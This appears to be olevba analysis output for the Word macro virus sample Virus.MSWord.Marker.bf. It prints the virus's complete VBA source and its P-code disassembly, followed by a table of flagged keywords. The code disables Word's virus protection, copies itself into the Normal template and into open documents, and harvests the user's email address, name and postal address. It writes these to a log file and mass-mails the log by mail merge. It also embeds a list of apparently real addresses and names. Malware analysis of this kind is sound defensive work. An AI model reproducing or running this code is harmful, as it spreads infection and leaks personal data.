olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.bf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.bf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marcador = "<->"

'Declarar Variables
Dim SalvarDocumento, SalvarPlantillaNormal, DocumentoInfectado, PlantillaNormalInfectada As Boolean
Dim ad, nt, ad2 As Object
Dim OurCode, UserAddress, LogData, LogFile As String
Dim CorreoPredeterminado, Email, DatosFichero, ExisteFichero As String


'Inicializar Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

'Para que no se vea nada
Application.ScreenUpdating = False


DocumentoInfectado = ad.codemodule.Find(Marcador, 1, 1, 10000, 10000)
PlantillaNormalInfectada = nt.codemodule.Find(Marcador, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False

If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") <> "kk") Then

    If DocumentoInfectado = True Then
      LogData = ad.codemodule.Lines(1, ad.codemodule.CountOfLines)
    ElseIf PlantillaNormalInfectada = True Then
      LogData = nt.codemodule.Lines(1, nt.codemodule.CountOfLines)
    End If

    LogData = Mid(LogData, InStr(1, LogData, "'Ordenadores " & "Infectados -->") + 29, Len(LogData) - InStr(1, LogData, "'Ordenadores " & "Infectados -->") + 29)

    LogFile = "C:\Scan8328" & ".sys"
    DatosFichero = ""
    For i = 1 To Len(LogData)
        If Mid(LogData, i, 1) <> "'" Then
            DatosFichero = DatosFichero & Mid(LogData, i, 1)
        End If
    Next
    
    Open LogFile For Output As #1
    Print #1, DatosFichero
    Close #1

    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = "kk"

End If

'Por Seguridad
If (DocumentoInfectado = True Xor PlantillaNormalInfectada = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
   'Infectar la Plantilla Normal
   If DocumentoInfectado = True Then
  
     SalvarPlantillaNormal = NormalTemplate.Saved
  
     OurCode = ad.codemodule.Lines(1, ad.codemodule.CountOfLines)

    
     'Escribir los datos de la nueva Infección

     CorreoPredeterminado = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager", "Default Mail Account")
     Email = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\" & CorreoPredeterminado, "SMTP Email Address")
     
     For i = 1 To Len(Application.UserAddress)
       If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
         If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
           UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
         End If
       End If
     Next i
     
     
     
     OurCode = OurCode & Chr(13) & _
              "'" & "Hello From;" & Email & ";" & _
              Format(Time, "hh:mm:ss AMPM - ") & _
              Format(Date, "dddd, d mmm yyyy") & ";" & _
              Application.UserName & " | " & UserAddress




     nt.codemodule.DeleteLines 1, nt.codemodule.CountOfLines
     nt.codemodule.AddFromString OurCode
   
     'If SalvarPlantillaNormal = True Then
     '   NormalTemplate.Save
     'End If
     
     If NormalTemplate.Saved = False Then
        NormalTemplate.Save
        PlantillaNormalInfectada = False
     End If
  End If

  'Infectar el documento activo
  If PlantillaNormalInfectada = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
     If ActiveDocument.MailMerge.DataSource.Name <> "C:\scan8328.sys" Then
       SalvarDocumento = ActiveDocument.Saved
    
       OurCode = nt.codemodule.Lines(1, nt.codemodule.CountOfLines)
    
       ad.codemodule.DeleteLines 1, ad.codemodule.CountOfLines
       ad.codemodule.AddFromString OurCode
    
       'If SalvarDocumento = True Then ActiveDocument.Save
       If ActiveDocument.Saved = False Then ActiveDocument.Save
     End If
  End If
 
  
   
End If
ExisteFichero = ""
ExisteFichero = Dir("c:\scan8328.sys")

If ExisteFichero <> "" And _
    ActiveDocument <> NormalTemplate.Name And _
    ActiveDocument.MailMerge.DataSource.Name <> "C:\scan8328.sys" Then
    'Comenzamos el envio de e-mailssssss.... : - )))
    
    Documents.Add
    Set ad2 = ActiveDocument.VBProject.VBComponents.Item(1)
    If ad2.codemodule.CountOfLines > 0 Then
        ad2.codemodule.DeleteLines 1, ad2.codemodule.CountOfLines
    End If
    ActiveDocument.MailMerge.MainDocumentType = wdFormLetters
    ActiveDocument.MailMerge.OpenDataSource "C:\scan8328.sys", Format:=wdOpenFormatText
    ActiveDocument.MailMerge.Destination = wdSendToEmail
    ActiveDocument.GoTo What:=wdGoToLine, Which:=wdGoToLast
    
    ActiveDocument.MailMerge.MailAddressFieldName = "correo"
    ActiveDocument.MailMerge.MailSubject = "Good Morning Torpedo ......."
    Set posicion = ActiveDocument.Content
    posicion.Font.ColorIndex = wdWhite
    posicion.InsertAfter Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13)
    Set posicion = Selection.GoTo(What:=wdGoToLine, Which:=wdGoToNext)
    ActiveDocument.MailMerge.Fields.Add Range:=posicion, Name:="Saludo"
    Set posicion = Selection.GoTo(What:=wdGoToLine, Which:=wdGoToNext)
    ActiveDocument.MailMerge.Fields.Add Range:=posicion, Name:="Correo"
    Set posicion = Selection.GoTo(What:=wdGoToLine, Which:=wdGoToNext)
    ActiveDocument.MailMerge.Fields.Add Range:=posicion, Name:="FechaHora"
    Set posicion = Selection.GoTo(What:=wdGoToLine, Which:=wdGoToNext)
    ActiveDocument.MailMerge.Fields.Add Range:=posicion, Name:="Usuario"
   
    ActiveDocument.MailMerge.Execute

End If

For i = 0 To Documents.Count - 1
    Documents(i).Activate
    ActiveDocument.Close wdDotNotSaveChanges
Next

Application.ScreenUpdating = True

End Sub

'Ordenadores Infectados -->
'Saludo;Correo;FechaHora;Usuario
'Hello From;consultas@ aeat.es;10:00;Grijander
'Hello From;patrimonio@ tsai.es;11:00;Grijander
'Hello From;infopyme@ ipyme.org;12:00;Grijander
'Hello From;infotur.spain@ tourspain.es;13:00;Grijander
'Hello From;web@ief.es;14:00;Grijander
'Hello From;info@ine.es;15:00;Grijander
'Hello From;luisps4@latinmail.com;04:01:20  - martes, 17 ago 1999;Luisa Fernanda Piñeiro Sanz
'Hello From;aramis@icm.csic.es;04:10:23  - martes, 2 nov 1999;Aramis |


'Hello From;zxczxc@sdfh.com;06:38:06 PM - Monday, 29 Nov 1999;Avert |


'Hello From;;10:49:41  - Samstag, 2 Jan 1999;Andreas Marx |


'Hello From;;09:52:43  - Freitag, 12 Okt 2001;Andreas Marx |


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.bf
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10950 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	Dim (Const) 
' 	LitStr 0x0003 "<->"
' 	VarDefn Marcador
' Line #5:
' Line #6:
' 	QuoteRem 0x0000 0x0012 "Declarar Variables"
' Line #7:
' 	Dim 
' 	VarDefn SalvarDocumento
' 	VarDefn SalvarPlantillaNormal
' 	VarDefn DocumentoInfectado
' 	VarDefn PlantillaNormalInfectada (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt
' 	VarDefn ad2 (As Object)
' Line #9:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #10:
' 	Dim 
' 	VarDefn CorreoPredeterminado
' 	VarDefn Email
' 	VarDefn DatosFichero
' 	VarDefn ExisteFichero (As String)
' Line #11:
' Line #12:
' Line #13:
' 	QuoteRem 0x0000 0x0015 "Inicializar Variables"
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #16:
' Line #17:
' 	QuoteRem 0x0000 0x0017 "Para que no se vea nada"
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #19:
' Line #20:
' Line #21:
' 	Ld Marcador 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentoInfectado 
' Line #22:
' 	Ld Marcador 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St PlantillaNormalInfectada 
' Line #23:
' Line #24:
' Line #25:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' Line #28:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0002 "kk"
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #29:
' Line #30:
' 	Ld DocumentoInfectado 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #32:
' 	Ld PlantillaNormalInfectada 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #34:
' 	EndIfBlock 
' Line #35:
' Line #36:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x000D "'Ordenadores "
' 	LitStr 0x000E "Infectados -->"
' 	Concat 
' 	FnInStr3 
' 	LitDI2 0x001D 
' 	Add 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x000D "'Ordenadores "
' 	LitStr 0x000E "Infectados -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	LitDI2 0x001D 
' 	Add 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #37:
' Line #38:
' 	LitStr 0x000B "C:\Scan8328"
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #39:
' 	LitStr 0x0000 ""
' 	St DatosFichero 
' Line #40:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	FnLen 
' 	For 
' Line #41:
' 	Ld LogData 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Ne 
' 	IfBlock 
' Line #42:
' 	Ld DatosFichero 
' 	Ld LogData 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St DatosFichero 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	StartForVariable 
' 	Next 
' Line #45:
' Line #46:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld DatosFichero 
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #49:
' Line #50:
' 	LitStr 0x0002 "kk"
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #51:
' Line #52:
' 	EndIfBlock 
' Line #53:
' Line #54:
' 	QuoteRem 0x0000 0x000D "Por Seguridad"
' Line #55:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentoInfectado 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld PlantillaNormalInfectada 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #56:
' Line #57:
' Line #58:
' 	QuoteRem 0x0003 0x001C "Infectar la Plantilla Normal"
' Line #59:
' 	Ld DocumentoInfectado 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #60:
' Line #61:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SalvarPlantillaNormal 
' Line #62:
' Line #63:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #64:
' Line #65:
' Line #66:
' 	QuoteRem 0x0005 0x0028 "Escribir los datos de la nueva Infección"
' Line #67:
' Line #68:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager"
' 	LitStr 0x0014 "Default Mail Account"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St CorreoPredeterminado 
' Line #69:
' 	LitStr 0x0000 ""
' 	LitStr 0x0047 "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\"
' 	Ld CorreoPredeterminado 
' 	Concat 
' 	LitStr 0x0012 "SMTP Email Address"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Email 
' Line #70:
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #72:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #73:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #74:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' 	LineCont 0x0010 09 00 0E 00 11 00 0E 00 18 00 0E 00 21 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitStr 0x000B "Hello From;"
' 	Concat 
' 	Ld Email 
' 	Concat 
' 	LitStr 0x0001 ";"
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitStr 0x0001 ";"
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0003 " | "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	St OurCode 
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #87:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #88:
' Line #89:
' 	QuoteRem 0x0005 0x0024 "If SalvarPlantillaNormal = True Then"
' Line #90:
' 	QuoteRem 0x0005 0x0016 "   NormalTemplate.Save"
' Line #91:
' 	QuoteRem 0x0005 0x0006 "End If"
' Line #92:
' Line #93:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #94:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #95:
' 	LitVarSpecial (False)
' 	St PlantillaNormalInfectada 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	EndIfBlock 
' Line #98:
' Line #99:
' 	QuoteRem 0x0002 0x001C "Infectar el documento activo"
' Line #100:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld PlantillaNormalInfectada 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #101:
' Line #102:
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	MemLd DataSource 
' 	MemLd New 
' 	LitStr 0x000F "C:\scan8328.sys"
' 	Ne 
' 	IfBlock 
' Line #103:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SalvarDocumento 
' Line #104:
' Line #105:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #106:
' Line #107:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #108:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #109:
' Line #110:
' 	QuoteRem 0x0007 0x0032 "If SalvarDocumento = True Then ActiveDocument.Save"
' Line #111:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	EndIfBlock 
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' 	EndIfBlock 
' Line #118:
' 	LitStr 0x0000 ""
' 	St ExisteFichero 
' Line #119:
' 	LitStr 0x000F "c:\scan8328.sys"
' 	ArgsLd Dir 0x0001 
' 	St ExisteFichero 
' Line #120:
' Line #121:
' 	LineCont 0x0008 05 00 04 00 0B 00 04 00
' 	Ld ExisteFichero 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld ActiveDocument 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ne 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	MemLd DataSource 
' 	MemLd New 
' 	LitStr 0x000F "C:\scan8328.sys"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #122:
' 	QuoteRem 0x0004 0x002F "Comenzamos el envio de e-mailssssss.... : - )))"
' Line #123:
' Line #124:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #125:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad2 
' Line #126:
' 	Ld ad2 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #127:
' 	LitDI2 0x0001 
' 	Ld ad2 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld ad2 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	Ld wdFormLetters 
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	MemSt MainDocumentType 
' Line #130:
' 	LitStr 0x000F "C:\scan8328.sys"
' 	Ld wdOpenFormatText 
' 	ParamNamed Format$ 
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	ArgsMemCall OpenDataSource 0x0002 
' Line #131:
' 	Ld wdSendToEmail 
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	MemSt Destination 
' Line #132:
' 	Ld wdGoToLine 
' 	ParamNamed What 
' 	Ld wdGoToLast 
' 	ParamNamed Which 
' 	Ld ActiveDocument 
' 	ArgsMemCall If 0x0002 
' Line #133:
' Line #134:
' 	LitStr 0x0006 "correo"
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	MemSt MailAddressFieldName 
' Line #135:
' 	LitStr 0x001C "Good Morning Torpedo ......."
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	MemSt MailSubject 
' Line #136:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	Set posicion 
' Line #137:
' 	Ld wdWhite 
' 	Ld posicion 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #138:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld posicion 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #139:
' 	SetStmt 
' 	Ld wdGoToLine 
' 	ParamNamed What 
' 	Ld wdGoToNext 
' 	ParamNamed Which 
' 	Ld Selection 
' 	ArgsMemLd If 0x0002 
' 	Set posicion 
' Line #140:
' 	Ld posicion 
' 	ParamNamed Range 
' 	LitStr 0x0006 "Saludo"
' 	ParamNamed New 
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	MemLd Fields 
' 	ArgsMemCall Add 0x0002 
' Line #141:
' 	SetStmt 
' 	Ld wdGoToLine 
' 	ParamNamed What 
' 	Ld wdGoToNext 
' 	ParamNamed Which 
' 	Ld Selection 
' 	ArgsMemLd If 0x0002 
' 	Set posicion 
' Line #142:
' 	Ld posicion 
' 	ParamNamed Range 
' 	LitStr 0x0006 "Correo"
' 	ParamNamed New 
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	MemLd Fields 
' 	ArgsMemCall Add 0x0002 
' Line #143:
' 	SetStmt 
' 	Ld wdGoToLine 
' 	ParamNamed What 
' 	Ld wdGoToNext 
' 	ParamNamed Which 
' 	Ld Selection 
' 	ArgsMemLd If 0x0002 
' 	Set posicion 
' Line #144:
' 	Ld posicion 
' 	ParamNamed Range 
' 	LitStr 0x0009 "FechaHora"
' 	ParamNamed New 
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	MemLd Fields 
' 	ArgsMemCall Add 0x0002 
' Line #145:
' 	SetStmt 
' 	Ld wdGoToLine 
' 	ParamNamed What 
' 	Ld wdGoToNext 
' 	ParamNamed Which 
' 	Ld Selection 
' 	ArgsMemLd If 0x0002 
' 	Set posicion 
' Line #146:
' 	Ld posicion 
' 	ParamNamed Range 
' 	LitStr 0x0007 "Usuario"
' 	ParamNamed New 
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	MemLd Fields 
' 	ArgsMemCall Add 0x0002 
' Line #147:
' Line #148:
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	ArgsMemCall Execute 0x0000 
' Line #149:
' Line #150:
' 	EndIfBlock 
' Line #151:
' Line #152:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #153:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #154:
' 	Ld wdDotNotSaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #155:
' 	StartForVariable 
' 	Next 
' Line #156:
' Line #157:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #158:
' Line #159:
' 	EndSub 
' Line #160:
' Line #161:
' 	QuoteRem 0x0000 0x001A "Ordenadores Infectados -->"
' Line #162:
' 	QuoteRem 0x0000 0x001F "Saludo;Correo;FechaHora;Usuario"
' Line #163:
' 	QuoteRem 0x0000 0x002D "Hello From;consultas@ aeat.es;10:00;Grijander"
' Line #164:
' 	QuoteRem 0x0000 0x002E "Hello From;patrimonio@ tsai.es;11:00;Grijander"
' Line #165:
' 	QuoteRem 0x0000 0x002E "Hello From;infopyme@ ipyme.org;12:00;Grijander"
' Line #166:
' 	QuoteRem 0x0000 0x0036 "Hello From;infotur.spain@ tourspain.es;13:00;Grijander"
' Line #167:
' 	QuoteRem 0x0000 0x0025 "Hello From;web@ief.es;14:00;Grijander"
' Line #168:
' 	QuoteRem 0x0000 0x0026 "Hello From;info@ine.es;15:00;Grijander"
' Line #169:
' 	QuoteRem 0x0000 0x005C "Hello From;luisps4@latinmail.com;04:01:20  - martes, 17 ago 1999;Luisa Fernanda Piñeiro Sanz"
' Line #170:
' 	QuoteRem 0x0000 0x0045 "Hello From;aramis@icm.csic.es;04:10:23  - martes, 2 nov 1999;Aramis |"
' Line #171:
' Line #172:
' Line #173:
' 	QuoteRem 0x0000 0x0044 "Hello From;zxczxc@sdfh.com;06:38:06 PM - Monday, 29 Nov 1999;Avert |"
' Line #174:
' Line #175:
' Line #176:
' 	QuoteRem 0x0000 0x003A "Hello From;;10:49:41  - Samstag, 2 Jan 1999;Andreas Marx |"
' Line #177:
' Line #178:
' Line #179:
' 	QuoteRem 0x0000 0x003B "Hello From;;09:52:43  - Freitag, 12 Okt 2001;Andreas Marx |"
' Line #180:
' Line #181:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

